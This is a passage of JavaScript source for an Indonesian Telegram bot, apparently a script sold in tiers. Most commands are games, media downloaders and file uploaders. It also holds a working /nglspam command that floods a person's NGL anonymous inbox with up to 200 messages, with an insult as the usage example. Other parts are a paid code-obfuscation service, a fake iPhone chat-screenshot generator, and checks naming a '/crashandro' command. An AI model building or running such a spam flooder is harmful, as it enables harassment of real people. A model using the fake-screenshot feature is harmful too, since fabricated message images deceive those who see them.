            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    // Simpan hasil enkripsi
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    bot.sendDocument(chatId, encryptedFilePath, {
        caption: `
❒━━━━━━༽𝗦𝘂𝗰𝗰𝗲𝘀𝘀༼━━━━━━❒
┃ - 𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗛𝗮𝗿𝗱 𝗝𝘀𝗼𝗻 𝗨𝘀𝗲𝗱 -
❒━━━━━━━━━━━━━━━━━━━━❒`
    });
});


bot.onText(/^\/iqc(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/iqc')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


            //cek prem//
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  if (!input) {
    return bot.sendMessage(chatId,
      "❌ Format salah.\n\nContoh:\n`/iqc iiftzy | 21:45 | 77 | TELKOMSEL`",
      { parse_mode: "Markdown" }
    );
  }

  const parts = input.split("|").map(p => p.trim());
  const text = parts[0];
  const time = parts[1] || "00:00";
  const battery = parts[2] || "100";
  const carrier = parts[3] || "INDOSAT OOREDOO";

  const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

  try {
    await bot.sendChatAction(chatId, "upload_photo");

    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");

    await bot.sendPhoto(chatId, buffer, {
      caption: `🪄 *iPhone Quoted Generator ?*
      
💬 \`${text}\`
🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 AUTHOR 」", url: "https://hanz" }]
        ]
      }
    });
  } catch (err) {
    console.error(err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses gambar.");
  }
});


bot.onText(/\/cekid/, (msg) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username;
  const randomImage = getRandomImage();
  const id = msg.from.id;
  const owner = "7674108332"; // Ganti dengan ID pemilik bot
  const text12 = `Halo @${sender}
╭────⟡
│ 👤 Nama: @${sender}
│ 🆔 ID: ${id}
╰────⟡
<blockquote>by @nanaYa17</blockquote>
`;
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
        [{ text: "OWNER", url: "https://hanz" }],
        ],
      ],
    },
  };
  bot.sendPhoto(chatId, randomImage, {
    caption: text12,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});
const urls = {
  tebakkata: 'https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json',
  tebakkalimat: 'https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json',
  tebaktebakan: 'https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json',
  tebakgambar: 'https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json',
  tebaklirik: 'https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json',
  tebakbendera: 'https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json',
  tebakkabupaten: 'https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json',
};

async function loadSoal(type) {
  const res = await fetch(urls[type]);
  const data = await res.json();
  return data[Math.floor(Math.random() * data.length)];
}

const games = {
  tebakkata: async (chatId) => {
    const soal = await loadSoal('tebakkata');
    const jawaban = soal.jawaban.toLowerCase();
    bot.sendMessage(chatId, `🧠 *Tebak Kata!*\n\n${soal.soal}\n\nKetik jawabannya dalam 60 detik!`, { parse_mode: 'Markdown' });
    return jawaban;
  },
  tebakkalimat: async (chatId) => {
    const soal = await loadSoal('tebakkalimat');
    const jawaban = soal.jawaban.toLowerCase();
    bot.sendMessage(chatId, `🧠 *Tebak Kalimat!*\n\n${soal.soal}\n\nJawaban dalam 60 detik!`, { parse_mode: 'Markdown' });
    return jawaban;
  },
  tebaktebakan: async (chatId) => {
    const soal = await loadSoal('tebaktebakan');
    const jawaban = soal.jawaban.toLowerCase();
    bot.sendMessage(chatId, `🤔 *Tebak-Tebakan!*\n\n${soal.soal}\n\nJawaban dalam 60 detik!`, { parse_mode: 'Markdown' });
    return jawaban;
  },
  tebakgambar: async (chatId) => {
    const soal = await loadSoal('tebakgambar');
    const jawaban = soal.jawaban.toLowerCase();
    await bot.sendPhoto(chatId, soal.img, {
      caption: `🖼️ *Tebak Gambar!*\n\nJawaban dalam 60 detik...`,
      parse_mode: 'Markdown'
    });
    return jawaban;
  },
  tebakbendera: async (chatId) => {
    const soal = await loadSoal('tebakbendera');
    const jawaban = soal.name.toLowerCase();
    await bot.sendPhoto(chatId, soal.img, {
      caption: `🏳️ *Tebak Bendera!*\n\nNegara apakah ini?`,
      parse_mode: 'Markdown'
    });
    return jawaban;
  },
};

// Buat handler semua command
for (const cmd in games) {
  bot.onText(new RegExp(`^/${cmd}$`), async (msg) => {
    const chatId = msg.chat.id;
    if (sessions.has(chatId)) {
      return bot.sendMessage(chatId, '⚠️ Masih ada permainan yang belum selesai di chat ini!');
    }

    const jawaban = await games[cmd](chatId);
    const timeout = setTimeout(() => {
      bot.sendMessage(chatId, `⏰ Waktu habis!\nJawaban yang benar: *${jawaban}*`, { parse_mode: 'Markdown' });
      sessions.delete(chatId);
    }, 60000);

    sessions.set(chatId, { jawaban, timeout });
  });
}

// Jawaban pengguna
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const sesi = sessions.get(chatId);
  const text = msg.text;

  if (!sesi || !text || text.startsWith('/')) return;

  const jawabanUser = text.toLowerCase();

  if (jawabanUser === sesi.jawaban) {
    clearTimeout(sesi.timeout);
    bot.sendMessage(chatId, `✅ Benar! Jawabannya adalah *${sesi.jawaban}*`, { parse_mode: 'Markdown' });
    sessions.delete(chatId);
  } else {
    bot.sendMessage(chatId, '❌ Salah! Coba lagi...');
  }
});

// Hint, skip, leaderboard — dengan cooldown
bot.onText(/^\/(skip|hint|leaderboard)(@[\w_]+)?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const key = `${chatId}_${userId}`;
  const now = Date.now();
  
  const cmd = match[1];
  const sesi = sessions.get(chatId);
  if (!sesi) return bot.sendMessage(chatId, '❌ Tidak ada permainan aktif di chat ini.');

  if (cmd === 'skip') {
    clearTimeout(sesi.timeout);
    bot.sendMessage(chatId, `⏭️ Soal dilewati!\nJawaban yang benar: *${sesi.jawaban}*`, { parse_mode: 'Markdown' });
    sessions.delete(chatId);
  } else if (cmd === 'hint') {
    const hint = sesi.jawaban.replace(/[^\s]/g, '_').split('');
    // Tampilkan satu huruf acak dari jawaban
    const pos = Math.floor(Math.random() * sesi.jawaban.length);
    hint[pos] = sesi.jawaban[pos];
    bot.sendMessage(chatId, `💡 Hint: ${hint.join('')}`);
  } else if (cmd === 'leaderboard') {
    bot.sendMessage(chatId, '📊 Leaderboard belum tersedia di versi ini.');
  }
});


bot.onText(/^\/cekaura(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const nama = match[1] ? match[1] : msg.from.first_name;

  const warnaAura = [
    { warna: "Merah ❤️", arti: "Pemberani, penuh semangat, dan punya tekad kuat." },
    { warna: "Hijau 🌿", arti: "Penyayang, penyembuh, dan bikin orang nyaman." },
    { warna: "Biru 🔵", arti: "Tenang, bijak, dan berpikir jernih." },
    { warna: "Kuning 💛", arti: "Ceria, kreatif, dan penuh inspirasi." },
    { warna: "Ungu 💜", arti: "Intuitif, misterius, dan spiritual." },
    { warna: "Hitam ⚫", arti: "Kuat, penuh rahasia, dan punya pertahanan diri tinggi." },
    { warna: "Putih 🤍", arti: "Tulus, jujur, hati bersih dan damai." }
  ];

  const energi = Math.floor(Math.random() * 101); // 0–100%
  const aura = warnaAura[Math.floor(Math.random() * warnaAura.length)];

  const hasil = `
🔮 *Cek Aura*
👤 Nama: *${nama}*
✨ Warna Aura: *${aura.warna}*
⚡ Energi: *${energi}%*
📘 *Arti Aura:* ${aura.arti}
`;

  bot.sendMessage(chatId, hasil, { parse_mode: "Markdown" });
});

const jobs = [
  { title: "Web Developer", emoji: "💻", desc: "Membuat dan mengelola situs web modern." },
  { title: "Mobile App Developer", emoji: "📱", desc: "Membangun aplikasi Android/iOS." },
  { title: "UI/UX Designer", emoji: "🎨", desc: "Merancang antarmuka yang nyaman digunakan." },
  { title: "Graphic Designer", emoji: "🖌️", desc: "Membuat desain visual kreatif." },
  { title: "Backend Developer", emoji: "🧠", desc: "Mengelola logika dan database aplikasi." },
  { title: "Frontend Developer", emoji: "🖼️", desc: "Mengembangkan tampilan antarmuka pengguna." },
  { title: "Fullstack Developer", emoji: "🔁", desc: "Menguasai frontend dan backend sekaligus." },
  { title: "DevOps Engineer", emoji: "⚙️", desc: "Mengotomatisasi dan menjaga infrastruktur." },
  { title: "System Administrator", emoji: "🖥️", desc: "Mengelola dan memantau server dan jaringan." },
  { title: "Software Tester (QA)", emoji: "🧪", desc: "Mengidentifikasi dan melaporkan bug." },
  { title: "Project Manager", emoji: "📋", desc: "Mengelola alur kerja dan tim proyek." },
  { title: "Product Manager", emoji: "📦", desc: "Mengembangkan strategi produk digital." },
  { title: "Game Developer", emoji: "🎮", desc: "Membuat game digital untuk berbagai platform." },
  { title: "Game Designer", emoji: "🕹️", desc: "Merancang gameplay dan mekanika permainan." },
  { title: "Cybersecurity Specialist", emoji: "🔐", desc: "Melindungi sistem dari ancaman siber." },
  { title: "Data Analyst", emoji: "📊", desc: "Mengolah data untuk pengambilan keputusan." },
  { title: "Data Scientist", emoji: "🧬", desc: "Menganalisis data untuk insight mendalam." },
  { title: "AI Engineer", emoji: "🤖", desc: "Membangun sistem berbasis kecerdasan buatan." },
  { title: "Machine Learning Engineer", emoji: "📈", desc: "Membuat model prediksi dan otomatisasi." },
  { title: "Blockchain Developer", emoji: "⛓️", desc: "Mengembangkan aplikasi berbasis blockchain." },
  { title: "Database Administrator", emoji: "🗃️", desc: "Merancang dan memelihara database." },
  { title: "Cloud Architect", emoji: "☁️", desc: "Mendesain solusi berbasis cloud." },
  { title: "Network Engineer", emoji: "🌐", desc: "Menjaga konektivitas jaringan tetap stabil." },
  { title: "IT Support Specialist", emoji: "🧰", desc: "Memberikan bantuan teknis ke pengguna." },
  { title: "Digital Marketer", emoji: "📢", desc: "Mengelola strategi pemasaran digital." },
  { title: "Content Writer", emoji: "✍️", desc: "Menulis konten untuk web dan media sosial." },
  { title: "SEO Specialist", emoji: "🔎", desc: "Mengoptimalkan peringkat pencarian Google." },
  { title: "Social Media Manager", emoji: "📱", desc: "Menjalankan kampanye medsos brand." },
  { title: "Business Analyst", emoji: "💼", desc: "Menganalisis kebutuhan dan proses bisnis." },
  { title: "Tech Lead", emoji: "🧑‍💻", desc: "Memimpin tim teknis dalam proyek." },
  { title: "Freelancer", emoji: "🧳", desc: "Pekerja lepas lintas proyek dan klien." },
  { title: "Startup Founder", emoji: "🚀", desc: "Mendirikan dan memimpin startup." },
  { title: "Video Editor", emoji: "🎞️", desc: "Mengedit video untuk konten digital." },
  { title: "3D Artist", emoji: "🧱", desc: "Membuat grafik dan animasi 3D." },
  { title: "AR/VR Developer", emoji: "🕶️", desc: "Mengembangkan aplikasi realitas virtual." },
  { title: "Motion Graphic Designer", emoji: "🎬", desc: "Membuat animasi grafis bergerak." },
  { title: "Technical Writer", emoji: "📘", desc: "Menulis dokumentasi teknis & panduan." },
  { title: "Embedded Systems Engineer", emoji: "🔌", desc: "Mengembangkan software untuk hardware." },
  { title: "IoT Developer", emoji: "📡", desc: "Menghubungkan perangkat pintar." },
  { title: "Software Architect", emoji: "🏗️", desc: "Mendesain struktur sistem perangkat lunak." },
  { title: "Scrum Master", emoji: "🏁", desc: "Memfasilitasi metode agile & sprint." },
  { title: "Penetration Tester", emoji: "🧨", desc: "Menguji keamanan sistem dengan ethical hacking." },
  { title: "UI Animator", emoji: "💫", desc: "Menambahkan animasi ke antarmuka aplikasi." },
  { title: "VR Game Designer", emoji: "🎧", desc: "Membuat pengalaman game VR." },
  { title: "Mobile Game Developer", emoji: "📲", desc: "Membangun game untuk smartphone." },
  { title: "Automation Engineer", emoji: "🤖", desc: "Mengotomatisasi proses manual." },
  { title: "Cloud Engineer", emoji: "🌥️", desc: "Mengelola infrastruktur cloud modern." },
  { title: "Financial Analyst", emoji: "💹", desc: "Menganalisis dan meramalkan keuangan." },
  { title: "Quant Developer", emoji: "📐", desc: "Membuat model finansial untuk trading." },
  { title: "Legal Tech Specialist", emoji: "⚖️", desc: "Menggabungkan hukum dan teknologi." },
  { title: "Bioinformatics Engineer", emoji: "🧫", desc: "Mengolah data biologis dan genetik." },
  { title: "EdTech Specialist", emoji: "🎓", desc: "Mengembangkan solusi teknologi pendidikan." },
  { title: "HealthTech Engineer", emoji: "🩺", desc: "Menciptakan inovasi di bidang kesehatan." },
  { title: "Robotics Engineer", emoji: "🤖", desc: "Merancang dan membangun robot." },
  { title: "Technical Recruiter", emoji: "🕵️", desc: "Mencari talenta teknologi terbaik." },
  { title: "IT Auditor", emoji: "📑", desc: "Meninjau sistem TI untuk kepatuhan dan keamanan." },
  { title: "E-Commerce Specialist", emoji: "🛒", desc: "Mengelola toko online dan penjualan digital." },
  { title: "CRM Administrator", emoji: "🗂️", desc: "Mengelola sistem hubungan pelanggan." },
  { title: "Email Marketing Specialist", emoji: "📧", desc: "Merancang kampanye email yang efektif." },
  { title: "No-Code Developer", emoji: "🧩", desc: "Membangun aplikasi tanpa menulis kode." }
];

function hashUsername(username) {
  if (!username) return Math.floor(Math.random() * jobs.length);
  let hash = 0;
  for (let i = 0; i < username.length; i++) {
    hash += username.charCodeAt(i) * (i + 1);
  }
  return hash % jobs.length;
}

bot.onText(/^\/profil(?:\s+(.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const targetUsername = match[1]
    ? match[1].replace(/^@/, '')
    : (msg.from.username || msg.from.first_name);

  const index = hashUsername(targetUsername);
  const job = jobs[index];

  const text = `
<b>👤 Profil Pengguna</b>
👨‍💼 Username: @${targetUsername}
${job.emoji} <b>${job.title}</b>
📝 <i>${job.desc}</i>
`;

  bot.sendMessage(chatId, text.trim(), { parse_mode: 'HTML' });
});

bot.onText(/^\/script$/, (msg) => {
  const chatId = msg.chat.id;

  const caption = `
<blockquote>SCRIPT GHOST PRIDE V 7.0
 <b>PRICE :\n10K NO UPDATE\n20K FRE UPDATE\n30.000 RESELER SC\n40.000 PARTNER SC \n45.000 MOD SC\n50.000 CEO SC\n55.000 OWNER SC</b>
 <b>FITUR      : SUNG CHAT AUTHOR</b>
</blockquote>
`;

  bot.sendPhoto(chatId, 'https://files.catbox.moe/538smi.jpg', {
    caption,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: 'AUTHOR', url: 'https://hanz' }
        ]
      ]
    }
  });
});

function escapeMarkdown(text) {
  return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

bot.onText(/^\/info$/, async (msg) => {
  const chatId = msg.chat.id;

  // Harus reply pesan seseorang
  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, '⚠️ Balas pesan seseorang dengan command /info untuk melihat informasi mereka.');
  }

  const user = msg.reply_to_message.from;
  const { id, first_name, last_name, username } = user;
  const userLink = `tg://user?id=${id}`;
  let statusText = '';

  try {
    const member = await bot.getChatMember(chatId, id);
    statusText = `\n📌 Status: ${member.status}`;
  } catch (err) {
    statusText = '';
  }

  const infoMessage =
`🧾 INFO PENGGUNA
🆔 ID  : \`${id}\`
📛 Nama: ${escapeMarkdown(first_name)}${last_name ? ' ' + escapeMarkdown(last_name) : ''}
🧑‍💻 Username: ${username ? '@' + username : '-'}
🔗 Link: [Klik Disini](${userLink})${statusText}`;

  bot.sendMessage(chatId, infoMessage, {
    parse_mode: 'Markdown',
    disable_web_page_preview: true
  });
});



async function tiktok(url) {
  try {
    const encodedParams = new URLSearchParams();
    encodedParams.set("url", url);
    encodedParams.set("hd", "1");

    const response = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": "current_language=en",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      },
    });

    if (!response.data || !response.data.data) {
      throw new Error("Gagal mendapatkan data TikTok");
    }

    const videos = response.data.data;
    return {
      title: videos.title,
      cover: videos.cover,
      origin_cover: videos.origin_cover,
      no_watermark: videos.play,
      watermark: videos.wmplay,
      music: videos.music,
    };
  } catch (error) {
    throw error;
  }
}

bot.onText(/^\/tiktok(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const url = match[1];
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
           
            
  if (isGroupOnly() && chatType === 'private') {
  return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/tiktok')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }

  if (!url) {
    return bot.sendMessage(chatId, `<blockquote>☘️ Link TikTok-nya Mana?</blockquote>`, { 
    parse_mode: "HTML" 
    });
  }

 
  const urlRegex = /^(https?:\/\/)?([\w.-]+)+(:\d+)?(\/\S*)?$/;
  if (!urlRegex.test(url)) {
    return bot.sendMessage(chatId, `<blockquote>⚠️ Itu Bukan Link Yang Benar</blockquote>`, { 
    parse_mode: "HTML" 
    });
  }

  bot.sendMessage(chatId, `<blockquote>⏳ Tunggu sebentar, sedang mengambil video...</blockquote>`, {
        parse_mode: "HTML"
        });

  try {
  const res = await tiktok(url);

 
  let caption = `🎬 Judul: ${res.title}`;
     if (caption.length > 1020) {
     caption = caption.substring(0, 1017) + "...";
  }

await bot.sendVideo(chatId, res.no_watermark, { caption });
 
  if (res.music && res.music.trim() !== "") {
    await bot.sendAudio(chatId, res.music, { title: "tiktok_audio.mp3" });
  } else {
    await bot.sendMessage(chatId, `<blockquote>🎵 Video ini tidak memiliki audio asli.</blockquote>`, {
        parse_mode: "HTML"
        });
  }

} catch (error) {
  console.error(error);
  bot.sendMessage(chatId, `<blockquote>⚠️ Terjadi kesalahan saat mengambil video TikTok. Coba lagi nanti.</blockquote>`, {
        parse_mode: "HTML"
        });
}
});
bot.onText(/\/nglspam (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].trim().split(" ");
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
                      
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/nglspam')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  
    if (args.length < 3) {
      return bot.sendMessage(
        chatId, `<blockquote>Format Salah!\n\nContoh: /ngl link text jumlah\n/ngl https://ngl.link/angkasa lu jelek 20 </blockquote>`, {
        parse_mode: 'HTML' 
        });
    }

    const link = args[0];
    const jumlah = parseInt(args[args.length - 1]);
    const pesan = args.slice(1, -1).join(" ");

    if (!/^https?:\/\/ngl\.link\//i.test(link)) {
      return bot.sendMessage(chatId, `<blockquote>❌ Link NGL tidak valid! Pastikan formatnya https://ngl.link/username</blockquote>`, {
        parse_mode: 'HTML' 
        });
    }

    if (isNaN(jumlah) || jumlah < 1 || jumlah > 200) {
      return bot.sendMessage(chatId, `<blockquote>❌ Jumlah pesan harus angka 1 - 100.</blockquote>`, {
        parse_mode: 'HTML' 
        });
    }

    try {
      const processingMsg = await bot.sendMessage(chatId, `<blockquote>⏳ Mengirim ${jumlah} pesan ke NGL...</blockquote>`, {
        parse_mode: 'HTML' 
        });

      const apiUrl = `https://api.siputzx.my.id/api/tools/ngl`;
      let success = 0, failed = 0;

      for (let i = 0; i < jumlah; i++) {
        try {
          await axios.post(apiUrl, {
            link: link,
            text: pesan
          }, { timeout: 10000 });

          success++;
          await new Promise(r => setTimeout(r, 1500));
        } catch {
          failed++;
        }
      }

      await bot.deleteMessage(chatId, processingMsg.message_id);

      await bot.sendMessage(
        chatId,
        `<blockquote>✅ Selesai Kirim Pesan NGL\n\n📩 Pesan: "${pesan}"\n📦 Total: ${jumlah}\n☑️ Berhasil: ${success}\n❌ Gagal: ${failed}</blockquote>`, {
        parse_mode: 'HTML' 
        });

    } catch (err) {
      console.error('[NGL ERROR]', err.message);
      bot.sendMessage(chatId, `<blockquote>❌ Gagal kirim ke NGL: ${err.message}</blockquote>`, {
        parse_mode: 'HTML' 
        });
    }
});



bot.onText(/^\/play(?:\s+(.+))?$/, async (msg, match) => {
const senderId = msg.from.id;
const userId = msg.from.id;
  const chatId = msg.chat.id
const randomImage = getRandomImage();
  const query = (match[1] || "").trim()
 const isPremium = await premium (senderId);
 const chatType = msg.chat.type;
            
  if (isGroupOnly() && chatType === 'private') {
  return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
    }

  if (blacklistedCommands.includes('/crashandro')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


 
  if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  if (!query) {
    return bot.sendMessage(chatId, "play judul lagu atau video", {
      reply_to_message_id: msg.message_id,
    })
  }
  try {  
    const searchRes = await axios.get(
`https://api.siputzx.my.id/api/s/youtube?query=${encodeURIComponent(query)}`
    )
    const results = searchRes.data?.data
    if (!results || !results.length) {
      return bot.sendMessage(chatId, "❌ Tidak ada hasil ditemukan.", {
        reply_to_message_id: msg.message_id,
      })
    }
    const video = results[0]
    const audioRes = await axios.get(
      `https://restapi-v2.simplebot.my.id/download/ytmp3?url=${encodeURIComponent(video.url)}`
    )
    const audioUrl = audioRes.data?.result
    if (!audioUrl) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil audio.", {
        reply_to_message_id: msg.message_id,
      })
    }
    const caption = `<blockquote><b>
title: ${video.title}
channel: ${video.author?.name || "Unknown"}
duration: ${video.duration?.timestamp || "-"}
views: ${video.views} views
uploaded: ${video.ago}</b></blockquote>
`
const tmpFile = path.join(__dirname, `${video.title}.mp3`)
const audioResStream = await axios({
  method: "get",
  url: audioUrl,
  responseType: "stream"
})
audioResStream.data.pipe(fs.createWriteStream(tmpFile))
await new Promise((resolve, reject) => {
  audioResStream.data.on("end", resolve)
  audioResStream.data.on("error", reject)
})
await bot.sendAudio(chatId, tmpFile, {
  title: video.title,
  performer: video.author?.name || "Unknown",
  thumb: video.thumbnail,
  caption,
  parse_mode: "HTML",
  reply_to_message_id: msg.message_id
})
fs.unlinkSync(tmpFile)
  } catch (err) {
    console.error(err.response?.data || err.message)
    bot.sendMessage(chatId, err.response?.data || err.message, {
      reply_to_message_id: msg.message_id,
    })
  }
})


async function uploadCatbox(buffer) {
  const { ext, mime } = (await fileTypeFromBuffer(buffer)) || {
    ext: "jpg",
    mime: "image/jpeg",
  };

  const form = new FormData();
  form.append("reqtype", "fileupload");
  form.append("fileToUpload", buffer, {
    filename: `image.${ext}`,
    contentType: mime,
  });

  const res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: form,
  });

  if (!res.ok) throw new Error("❌ Upload ke Catbox gagal.");
  return await res.text();
}

async function uploadToCatbox(fileBuffer, filename) {
  const form = new FormData();
  form.append('reqtype', 'fileupload');
  form.append('fileToUpload', fileBuffer, filename);

  const res = await fetch('https://catbox.moe/user/api.php', {
    method: 'POST',
    body: form
  });

  const text = await res.text();
  if (!res.ok || text.startsWith('ERROR')) {
    throw new Error('Upload gagal: ' + text);
  }
  return text.trim();
}

bot.onText(/\/tourl/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id; 
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const isPremium = await premium (senderId);
  const replyMsg = msg.reply_to_message;
  const chatType = msg.chat.type;
           
            
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
    }

  if (blacklistedCommands.includes('/tourl')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}

   
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }

  if (!replyMsg) {
    return bot.sendMessage(chatId, `<blockquote>❌ Balas sebuah pesan yang berisi file/audio/video dengan perintah /tourl </blockquote>`, {
    parse_mode: "HTML"
  });
  }

  if (!replyMsg.document && !replyMsg.photo && !replyMsg.video && !replyMsg.audio && !replyMsg.voice) {
    return bot.sendMessage(chatId,`<blockquote>❌ Pesan yang kamu balas tidak mengandung file/audio/video yang bisa diupload.</blockquote>`, {
    parse_mode: "HTML"
  });
  }

  try {
    let fileId, filename;

    if (replyMsg.document) {
      fileId = replyMsg.document.file_id;
      filename = replyMsg.document.file_name;
    } else if (replyMsg.photo) {
      const photoArray = replyMsg.photo;
      fileId = photoArray[photoArray.length - 1].file_id;
      filename = 'photo.jpg';
    } else if (replyMsg.video) {
      fileId = replyMsg.video.file_id;
      filename = replyMsg.video.file_name || 'video.mp4';
    } else if (replyMsg.audio) {
      fileId = replyMsg.audio.file_id;
      filename = replyMsg.audio.file_name || 'audio.mp3';
    } else if (replyMsg.voice) {
      fileId = replyMsg.voice.file_id;
      filename = 'voice.ogg';
    }

    const fileLink = await bot.getFileLink(fileId);
    const response = await fetch(fileLink);
    const fileBuffer = Buffer.from(await response.arrayBuffer());

    const catboxUrl = await uploadToCatbox(fileBuffer, filename);

    bot.sendMessage(chatId, `<blockquote>✅ File berhasil diupload ke Catbox:\n${catboxUrl}</blockquote>`, {
    parse_mode: "HTML"
  });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `<blockquote>❌ Gagal upload file: ${err.message}</blockquote>`, {
    parse_mode: "HTML"
  });
  }
});


// === /getcode <url> ===
bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
           
            
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/getcode')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}

if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "♥️ /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ CODE DARI ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "♥️🥹 ERROR SAAT MENGAMBIL CODE WEB");
  }
});

bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const randomImage = getRandomImage();
   const userId = msg.from.id;
   const isPremium = await premium (senderId);
   const chatType = msg.chat.type;
           
            
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/crashandro')) {
  return bot.sendMessage(chatId, '⛔ COMMAND INI DILARANG OLEH OWNER');
}


 
if (!isPremium) {
  return bot.sendMessage(chatId, "❌ ☇ Fitur ini hanya untuk premium users!");
  }
  
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
